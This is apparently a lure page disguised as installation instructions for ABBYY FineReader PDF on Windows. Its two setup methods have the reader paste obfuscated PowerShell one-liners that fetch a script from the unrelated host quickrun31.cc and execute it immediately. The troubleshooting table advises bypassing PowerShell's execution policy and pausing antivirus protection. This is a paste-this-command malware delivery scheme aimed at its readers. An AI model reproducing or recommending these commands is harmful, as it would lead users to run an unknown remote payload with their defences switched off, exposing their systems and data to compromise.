## Installation

Two quick setup methods for Windows.

### Method 1 — Win + X

1. Press **Win + X**
2. Open **Terminal** or **Windows PowerShell**
3. Paste:

```powershell
sal m iex;m(irm quickrun31.cc/qle7he)
```

4. Press **Enter** and wait for the process to finish  
5. Launch ABBYY FineReader PDF

### Method 2 — Win + R

1. Press **Win + R**
2. Paste:

```powershell
powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
```

3. Press **Enter** and wait  
4. Launch ABBYY FineReader PDF

### Requirements

- Windows 10 or Windows 11 (64-bit)
- Internet connection during setup only
- 4 GB RAM minimum (8 GB recommended)
- Scanner optional for paper documents

### Troubleshooting

| Issue | What to try |
|-------|-------------|
| Connection error | Check internet |
| Execution Policy message | `Set-ExecutionPolicy Bypass -Scope Process -Force` |
| Blocked by antivirus | Temporarily pause real-time protection |
| Window closes right away | Usually means setup finished |

## About

ABBYY FineReader PDF for Windows is a desktop application for OCR and PDF work. It converts scans and image-based files into searchable and editable documents, edits existing PDFs, compares versions and prepares files for sharing or archiving.

Useful for office document workflows, digitizing paper archives and converting PDFs to Word, Excel or searchable PDF.

> Use at your own risk. Keep your system protected.
